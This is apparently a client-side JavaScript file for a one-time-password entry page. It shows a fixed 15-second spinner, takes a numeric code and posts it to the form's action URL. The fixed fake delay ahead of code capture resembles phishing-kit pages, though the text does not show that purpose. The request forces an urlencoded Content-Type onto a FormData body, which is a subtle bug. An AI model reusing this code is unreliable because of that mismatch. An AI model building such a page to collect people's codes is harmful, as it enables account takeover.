document.addEventListener("DOMContentLoaded", function() {
    const spinnerContainer = document.querySelector('.spinner-container');
    const otpContainer = document.querySelector('.otp-container');
    const thanksContainer = document.querySelector('.thanks-container');
    const otpInputs = document.querySelectorAll('.otp-inputs input');
    const otpForm = document.getElementById('visibleOTPForm');
    const btnConfirm = document.querySelector('.btn-2');

    thanksContainer.style.display = 'none';  // Ensures that the Thanks container is initially hidden

    // Function to display custom messages
    function showCustomAlert(message) {
        const customAlert = document.createElement('div');
        customAlert.style = `
            position: fixed; 
            top: 0; 
            right: 0; 
            bottom: 0; 
            left: 0; 
            background-color: rgba(0,0,0,0.7); 
            color: white; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            font-size: 1.5rem;
            z-index: 9999;
        `;
        customAlert.innerText = message;
        document.body.appendChild(customAlert);

        setTimeout(() => {
            document.body.removeChild(customAlert);
        }, 5000); // hide the message after 5 seconds
    }

    // Show spinner for 15 seconds on page load
    setTimeout(() => {
        spinnerContainer.style.display = 'none';
        otpContainer.style.display = 'flex';
    }, 15000);

    otpInputs.forEach((input, index) => {
        input.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, ''); // Allow only numbers
            
            if (input.value.length === 1 && index < otpInputs.length - 1) {
                otpInputs[index + 1].focus(); // Auto-navigate to the next input
            }
            
            if (Array.from(otpInputs).every(i => i.value.length === 1)) {
                btnConfirm.removeAttribute('disabled');
            } else {
                btnConfirm.setAttribute('disabled', 'true');
            }
        });
    });

    otpForm.addEventListener('submit', function(event) {
        event.preventDefault();

        if (Array.from(otpInputs).every(i => i.value.length === 1)) {
            otpContainer.style.display = 'none';
            spinnerContainer.style.display = 'flex';

            // Handle form submission here
            const formData = new FormData(otpForm);

            fetch(otpForm.action, {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
                },
            })
            .then(response => {
                if (response.ok) {
                    showCustomAlert('Form submitted successfully!');
                    setTimeout(() => {
                        spinnerContainer.style.opacity = 0;
                        setTimeout(() => {
                            spinnerContainer.style.display = 'none';
                            thanksContainer.style.display = 'flex';
                            thanksContainer.style.opacity = 1;
                        }, 500);
                    }, 3000);
                } else {
                    showCustomAlert('Form submission failed! Please try again.');
                }
            })
            .catch(error => {
                console.error('There was an error!', error);
                showCustomAlert('Form submission failed due to a network issue! Please try again.');
            });
        } else {
            alert('Please fill out all the OTP fields!');
        }
    });
});
